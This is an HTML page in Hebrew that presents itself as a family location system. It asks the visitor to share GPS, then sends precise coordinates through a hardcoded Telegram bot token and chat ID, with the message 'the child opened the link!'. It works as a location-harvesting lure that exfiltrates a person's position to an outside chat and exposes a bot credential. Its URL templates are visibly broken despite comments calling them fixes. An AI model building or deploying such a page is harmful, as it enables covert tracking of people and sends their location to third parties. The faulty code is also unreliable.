<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>איתור מיקום למשפחה</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background-color: #f0f2f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { color: #333; font-size: 24px; }
        p { color: #666; font-size: 16px; margin-bottom: 25px; }
        .btn { display: inline-block; background-color: #28a745; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; width: 100%; box-sizing: border-box; }
        .btn:hover { background-color: #218838; }
        .status { font-weight: bold; color: #dc3545; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <h1>מערכת איתור משפחתית</h1>
    <p>כדי לעדכן את ההורים במיקומך המדויק, לחץ על הכפתור הירוק למטה ואשר את בקשת המיקום שתוצג על המסך.</p>
    
    <button class="btn" onclick="askGPS()">📍 לחץ כאן לשיתוף מיקום</button>
    
    <div id="status" class="status"></div>
</div>

<script>
    const TELEGRAM_TOKEN = '8573992916:AAHFZye_BN7FwKRUJHS24D4pw99v9dwnG6A';
    const CHAT_ID = '8714686528';

    function askGPS() {
        document.getElementById('status').style.color = '#007bff';
        document.getElementById('status').innerText = "מבקש גישה ל-GPS...";
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(redirectToTelegram, showError, {
                enableHighAccuracy: true,
                timeout: 7000,
                maximumAge: 0
            });
        } else {
            document.getElementById('status').innerText = "הדפדפן שלך לא תומך ב-GPS.";
        }
    }

    function redirectToTelegram(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = Math.round(position.coords.accuracy);
        
        document.getElementById('status').style.color = '#28a745';
        document.getElementById('status').innerText = "המיקום התקבל! מעביר לטלגרם...";

        // תיקון 1: קישור מפת גוגל תקין ומובנה
        const mapsLink = `https://google.com{lat},${lon}`;
        const message = encodeURIComponent(`🚨 הילד פתח את הקישור!\n📍 מיקום: ${mapsLink}\n🎯 רמת דיוק: ${accuracy} מטרים.`);

        // תיקון 2: כתובת השרת הרשמית של הבוטים בטלגרם (api.telegram.org/bot...)
        const finalUrl = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
        
        window.location.href = finalUrl;
    }

    function showError(error) {
        document.getElementById('status').style.color = '#dc3545';
        switch(error.code) {
            case error.PERMISSION_DENIED:
                document.getElementById('status').innerText = "❌ חובה ללחוץ 'אשר' (Allow) על בקשת המיקום.";
                break;
            case error.POSITION_UNAVAILABLE:
                document.getElementById('status').innerText = "❌ ה-GPS במכשיר כבוי. אנא הפעל אותו.";
                break;
            case error.TIMEOUT:
                document.getElementById('status').innerText = "❌ הזמן עבר. אנא לחץ שוב על הכפתור.";
                break;
            default:
                document.getElementById('status').innerText = "❌ שגיאה בלתי צפויה.";
                break;
        }
    }
</script>

</body>
</html>
